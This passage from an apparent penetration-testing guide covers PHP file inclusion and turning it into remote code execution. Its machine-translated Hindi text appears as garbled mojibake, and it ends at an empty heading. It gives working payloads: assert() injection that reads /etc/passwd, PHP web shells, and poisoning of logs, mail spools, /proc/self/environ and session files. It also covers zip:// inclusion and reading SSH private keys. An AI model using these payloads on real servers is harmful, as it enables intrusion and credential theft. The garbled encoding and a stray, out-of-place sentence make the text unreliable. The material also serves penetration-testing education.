**PHP рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ PHP рд╕реЗ рдХрд┐рд╕реА рднреА рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛** рддрд╛рдХрд┐ рдЖрд░рд╕реАрдИ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рд╡рд░рдг [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
рдмрд╣реБрдд рддреЗрдЬ рд╕рд╛рд░рд╛рдВрд╢: PHP рд╣реАрдк рдореЗрдВ **3 рдмрд╛рдЗрдЯ рдУрд╡рд░рдлрд╝реНрд▓реЛ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддрд╛рдХрд┐ **рдирд┐рд╢реНрдЪрд┐рдд рдЖрдХрд╛рд░ рдХреЗ рдореБрдлреНрдд рдЯреБрдХрдбрд╝реЛрдВ рдХреА рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЛ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХреЗ** рддрд╛рдХрд┐ рдХрд┐рд╕реА рднреА рдкрддреЗ рдкрд░ рдХреБрдЫ рднреА рд▓рд┐рдЦрд╛ рдЬрд╛ рд╕рдХреЗ, рдЗрд╕рд▓рд┐рдП рдПрдХ рд╣реБрдХ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рдерд╛ рдЬрд┐рд╕рд╕реЗ **`system`** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
рдЕрдзрд┐рдХ PHP рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЖрдХрд╛рд░реЛрдВ рдХреЗ рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ред

### рдЕрдзрд┐рдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓

рдпрд╣рд╛рдБ рдФрд░ рднреА [**рдпрд╣рд╛рдБ рд╕рдорд╛рд╣рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓**](https://www.php.net/manual/en/wrappers.php)** рдЬрд╛рдВрдЪреЗрдВ:**

* [php://memory рдФрд░ php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) тАФ рдореЗрдореЛрд░реА рдореЗрдВ рдпрд╛ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦреЗрдВ (рдпрд╣ рдХреИрд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди рд╣рдорд▓реЗ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдирд╣реАрдВ рд╣реИ)
* [file://](https://www.php.net/manual/en/wrappers.file.php) тАФ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдгрд╛рд▓реА рддрдХ рдкрд╣реБрдБрдЪрдирд╛
* [http://](https://www.php.net/manual/en/wrappers.http.php) тАФ HTTP(s) URL рддрдХ рдкрд╣реБрдБрдЪрдирд╛
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) тАФ FTP(s) URL рддрдХ рдкрд╣реБрдБрдЪрдирд╛
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) тАФ рд╕рдВрдкреАрдбрд╝рди рд╕реНрдЯреНрд░реАрдо
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) тАФ рдкреИрдЯрд░реНрди рд╕реЗ рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкрдердирд╛рдо рдЦреЛрдЬреЗрдВ (рдпрд╣ рдХреБрдЫ рднреА рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣рд╛рдБ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) тАФ рд╕реБрд░рдХреНрд╖рд┐рдд рд╢реИрд▓реА 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) тАФ рдСрдбрд┐рдпреЛ рд╕реНрдЯреНрд░реАрдореНрд╕ (рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ)
```bash
assert("strpos('$file', '..') === false") or die("");
```
рдЬрдмрдХрд┐ рдпрд╣ рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рдХреЛ рд░реЛрдХрдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд░рдЦрддрд╛ рд╣реИ, рдпрд╣ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдХреЛрдб рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реЗрдХреНрдЯрд░ рдмрдирд╛ рджреЗрддрд╛ рд╣реИред рдлрд╝рд╛рдЗрд▓ рд╕рд╛рдордЧреНрд░реА рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
рдЙрд╕реА рддрд░рд╣, рдЕрдирд┐рдпрдорд┐рдд рд╕рд┐рд╕реНрдЯрдо рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рднреА рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```plaintext
' and die(system("id")) or '
```
рдпреЗ payloads **URL-encode рдХрд░рдирд╛** рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рдЙрддреНрд╕рд╛рд╣ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рдиреНрдпреВрдЬрд╝**\
рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рдиреНрдпреВрдЬрд╝ рдФрд░ рдЕрдВрджрд░реВрдиреА рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реИрдХрд┐рдВрдЧ рд╡рд┐рд╢реНрд╡ рдХреЗ рд╕рд╛рде рдЕрдк-рдЯреВ-рдбреЗрдЯ рд░рд╣реЗрдВ

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдБ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд▓реЙрдиреНрдЪ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЕрдкрдбреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

[**Discord**](https://discord.com/invite/N3FrSbmwdy) рдкрд░ рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

## PHP рдмреНрд▓рд╛рдЗрдВрдб рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓

{% hint style="warning" %}
рдпрд╣ рддрдХрдиреАрдХ рдЙрд╕ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдЬрд╣рд╛рдБ рдЖрдк **рдирд┐рдпрдВрддреНрд░рдг** рдХрд░рддреЗ рд╣реИрдВ **PHP рдлрд╝рдВрдХреНрд╢рди** рдХреЗ **рдлрд╝рд╛рдЗрд▓ рдкрде** рдХреЛ рдЬреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдЧрд╛** рд▓реЗрдХрд┐рди рдЖрдк рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд╣реАрдВ рджреЗрдЦреЗрдВрдЧреЗ (рдЬреИрд╕реЗ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдХреЙрд▓ рдХрд░рдирд╛ **`file()`**) рд▓реЗрдХрд┐рди рд╕рд╛рдордЧреНрд░реА рдирд╣реАрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧреАред
{% endhint %}

[**рдЗрд╕ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдкреЛрд╕реНрдЯ**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) рдореЗрдВ рдпрд╣ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЧрдИ рд╣реИ рдХрд┐ PHP рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдмреНрд▓рд╛рдЗрдВрдб рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рдХреЛ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ рддреНрд░реБрдЯрд┐ рдУрд░реЗрдХрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ **рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХреЗ**ред

рд╕рд╛рд░рд╛рдВрд╢ рдореЗрдВ, рддрдХрдиреАрдХ рдпрд╣ рд╣реИ рдХрд┐ **"UCS-4LE" рдЗрдиреНрдХреЛрдбрд┐рдВрдЧ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЗрддрдиреА **рдмрдбрд╝реА** рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЦреЛрд▓рдиреЗ рд╡рд╛рд▓рд╛ **PHP рдлрд╝рдВрдХреНрд╢рди** рдПрдХ **рддреНрд░реБрдЯрд┐** рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред

рдлрд┐рд░, рдкрд╣рд▓реЗ рд╡рд░реНрдг рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд┐рд▓реНрдЯрд░ **`dechunk`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рд╕рд╛рде рд╣реА рдЕрдиреНрдп рдЬреИрд╕реЗ **base64** рдпрд╛ **rot13** рдФрд░ рдЕрдВрдд рдореЗрдВ рдлрд╝рд┐рд▓реНрдЯрд░ **convert.iconv.UCS-4.UCS-4LE** рдФрд░ **convert.iconv.UTF16.UTF-16BE** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдиреНрдп рд╡рд░реНрдгреЛрдВ рдХреЛ рд╢реБрд░реВ рдореЗрдВ рд░рдЦрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

**рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдлрд╝рдВрдХреНрд╢рди**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (рдХреЗрд╡рд▓ рдЗрд╕рдХреЗ рд╕рд╛рде рдХреЗрд╡рд▓ рдЯрд╛рд░рдЧреЗрдЯ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

рддрдХрдиреАрдХреА рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!

## LFI2RCE

### рд░рд┐рдореЛрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢

рдкрд╣рд▓реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛, [**рдЗрд╕ рд▓рд┐рдВрдХ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**](./#remote-file-inclusion)ред

### Apache/Nginx рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ Apache рдпрд╛ Nginx рд╕рд░реНрд╡рд░ **LFI рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓** рд╣реИрдВ рддреЛ рдЖрдк **`/var/log/apache2/access.log` рдпрд╛ `/var/log/nginx/access.log`** рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рдпреВрдЬрд╝рд░ рдПрдЬреЗрдВрдЯ** рдпрд╛ **GET рдкреИрд░рд╛рдореАрдЯрд░** рдореЗрдВ рдПрдХ PHP рд╢реИрд▓ рдЬреИрд╕реЗ **`<?php system($_GET['c']); ?>`** рдбрд╛рд▓реЗрдВ рдФрд░ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░реЗрдВред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдпрджрд┐ рдЖрдк рд╢реИрд▓ рдХреЗ рд▓рд┐рдП рдбрдмрд▓ рдХреЛрдЯреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЙрди рдбрдмрд▓ рдХреЛрдЯреНрд╕ рдХреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ "_**quote;**_" рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, **PHP рд╡рд╣рд╛рдБ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХреЗрдЧрд╛** рдФрд░ **рдХреБрдЫ рднреА рдирд╣реАрдВ рдЪрд▓реЗрдЧрд╛**ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк **рдкреЗрд▓реЛрдб рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд▓рд┐рдЦреЗрдВ** рдпрд╛ PHP рд╣рд░ рдмрд╛рд░ рдЬрдм рд╡рд╣ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ рддреЛ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХреЗрдЧрд╛ рдФрд░ рдЖрдкрдХреЛ рджреВрд╕рд░рд╛ рдореМрдХрд╛ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛ред
{% endhint %}

рдпрд╣ рдЕрдиреНрдп рд▓реЙрдЧ рдореЗрдВ рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ,** рд▓реЙрдЧ рдореЗрдВ рджреА рдЧрдИ рдХреЛрдб URL рдЗрдиреНрдХреЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рд╢реИрд▓ рдХреЛ рдирд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╣реЗрдбрд░ **рдСрдерд░рд╛рдЗрдЬрд╝реЗрд╢рди "рдмреЗрд╕рд┐рдХ"** рдореЗрдВ "рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛:рдкрд╛рд╕рд╡рд░реНрдб" Base64 рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рд▓реЙрдЧ рдореЗрдВ рдбрд┐рдХреЛрдб рд╣реЛрддрд╛ рд╣реИред PHPShell рдЗрд╕ рд╣реЗрдбрд░ рдХреЗ рдЕрдВрджрд░ рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЕрдиреНрдп рд╕рдВрднрд╛рд╡рд┐рдд рд▓реЙрдЧ рдкрде:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### рдИрдореЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

**рдПрдХ рдореЗрд▓** рднреЗрдЬреЗрдВ рдПрдХ рдЖрдВрддрд░рд┐рдХ рдЦрд╛рддреЗ (user@localhost) рдХреЛ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХрд╛ PHP рдкреЗрд▓реЛрдб рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреИрд╕реЗ `<?php echo system($_REQUEST["cmd"]); ?>` рдФрд░ рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдореЗрд▓ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ рдПрдХ рдкрде рдХреЗ рд╕рд╛рде рдЬреИрд╕реЗ **`/var/mail/<USERNAME>`** рдпрд╛ **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\* рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

1. рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╢реИрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: 100)
2. рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), $PID = рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ PID (рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ) рдФрд░ $FD рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рд╣реИ (рдпрд╣ рднреА рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)

### /proc/self/environ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдПрдХ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рддрд░рд╣, рдкреЗрд▓реЛрдб рдХреЛ рдпреВрдЬрд╝рд░-рдПрдЬреЗрдВрдЯ рдореЗрдВ рднреЗрдЬреЗрдВ, рдпрд╣ /proc/self/environ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдЧрд╛
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЙрд╕рдореЗрдВ рд╢реИрд▓ рдкреЗрд▓реЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ (рдЙрджрд╛. : `<?php system($_GET['c']); ?>` )ред
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
### рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдПрдХ рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ PHP рд╢реИрд▓ рд╕рдВрдХреБрдЪрд┐рдд рд╣реЛ рдФрд░ рдкрд╣реБрдВрдЪреЗрдВ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рд╡реЗрдмрд╕рд╛рдЗрдЯ PHP рд╕рддреНрд░ (PHPSESSID) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИрдВ
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP рдореЗрдВ рдпреЗ рд╕реЗрд╢рди _/var/lib/php5/sess\\_\[PHPSESSID]\_ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
рдЪреВрдВрдХрд┐ рдпрд╣ рдПрдХ рд╡реЗрдм рдЕрдиреБрдХреНрд░рдордгрд┐рдХрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдПрдХ рдЕрддреНрдпрдВрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджреЗрд╢ рд╣реИред рдХреГрдкрдпрд╛ рдЗрд╕реЗ рдзреНрдпрд╛рди рд╕реЗ рдкрдврд╝реЗрдВ рдФрд░ рдЗрд╕реЗ рдЕрдкрдиреЗ рд╡реЗрдм рдЕрдиреБрдХреНрд░рдордгрд┐рдХрд╛ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
рдПрд▓рдПрдлрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ PHP рд╕рддреНрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдорд╛рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### рдорд╛рдзреНрдпрдо рд╕реЗ ssh

рдпрджрд┐ ssh рд╕рдХреНрд░рд┐рдп рд╣реИ рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ (/proc/self/status & /etc/passwd) рдФрд░ **\<HOME>/.ssh/id\_rsa** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

### **Via** **vsftpd** _**logs**_

FTP рд╕рд░реНрд╡рд░ vsftpd рдХреЗ рд▓реЙрдЧ _**/var/log/vsftpd.log**_ рдкрд░ рд╕реНрдерд┐рдд рд╣реИрдВред рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЬрд╣рд╛рдВ рдПрдХ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рджреБрд░реБрдкрдпреЛрдЧ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ, рдФрд░ рдПрдХ рдЙрдЬрд╛рдЧрд░ vsftpd рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдВрднрд╡ рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдо рд╡рд┐рдЪрд╛рд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

1. рд▓реЙрдЧрд┐рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд╝реАрд▓реНрдб рдореЗрдВ рдПрдХ PHP рдкреЗрд▓реЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВред
2. рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдмрд╛рдж, LFI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ _**/var/log/vsftpd.log**_ рд╕реЗ рд╕рд░реНрд╡рд░ рд▓реЙрдЧреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред

### Via php base64 filter (using base64)

